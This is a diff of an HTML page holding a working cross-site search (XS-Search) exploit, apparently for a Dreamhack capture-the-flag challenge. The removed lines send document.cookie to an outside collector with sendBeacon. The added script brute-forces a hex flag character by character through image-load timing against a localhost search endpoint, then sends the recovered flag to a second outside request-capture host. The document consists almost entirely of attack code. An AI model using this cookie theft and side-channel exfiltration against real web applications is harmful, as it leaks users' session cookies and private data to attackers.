@@ -1,4 +1,59 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>XS-Search Exfil (HEX 10)</title>
 <script>
-  navigator.sendBeacon('https://pxpkdzk.request.dreamhack.games/haha',
-    document.cookie); 
+(async () => {
+  const HEX = "0123456789ABCDEF";
+  let body = "";                 
+  const base = "DH{";
+
+  function probeIMG(q) {
+    return new Promise((resolve) => {
+      const img = new Image();
+      img.onload = () => resolve(true);     // 보통 200
+      img.onerror = () => resolve(false);   // 보통 404
+      img.src = "http://localhost:3000/posts/search?query=" +
+                encodeURIComponent(q) + "&_=" + Math.random();
+    });
+  }
+
+  function probeCSS(q) {
+    return new Promise((resolve) => {
+      const link = document.createElement("link");
+      link.rel = "stylesheet";
+      link.href = "http://localhost:3000/posts/search?query=" +
+                  encodeURIComponent(q) + "&_=" + Math.random();
+      link.onload  = () => { link.remove(); resolve(true);  };
+      link.onerror = () => { link.remove(); resolve(false); };
+      document.head.appendChild(link);
+    });
+  }
+
+  const probe = probeIMG;
+
+  while (body.length < 10) {
+    let hit = false;
+    for (const c of HEX) {
+      const guess = base + body + c;
+      const ok = await probe(guess);
+      if (ok) {                    
+        body += c;
+        console.log("[*] hit:", base + body);
+        hit = true;
+        break;
+      }
+    }
+    if (!hit) {               
+      console.log("[-] no candidate matched at pos", body.length);
+      break;
+    }
+  }
+
+  const flag = base + body + "}";
+  console.log("[+] FLAG?", flag);
+  
+  new Image().src = "https://rylwggi.request.dreamhack.games/leak?f=" + encodeURIComponent(flag);
+
+  document.body.innerHTML = `<h1>Done</h1><p>${flag}</p>`;
+})();
 </script>
